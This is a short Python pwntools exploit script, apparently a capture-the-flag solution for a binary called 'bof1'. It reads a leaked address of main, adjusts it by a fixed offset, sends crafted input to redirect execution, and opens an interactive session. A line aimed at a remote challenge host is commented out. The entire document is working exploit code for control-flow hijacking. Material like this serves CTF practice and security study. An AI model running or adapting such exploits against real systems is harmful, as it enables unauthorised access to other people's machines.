import pwn
p = pwn.process("./bof1")

#p = pwn.remote("34.121.178.119",13371)

p.recvuntil('your main ')
main = p.readline()[:14]
main = int(main.decode('utf-8'),16) - (0x9d - 0x09)
p.sendline(str(19))
p.write(str(main))
p.interactive()
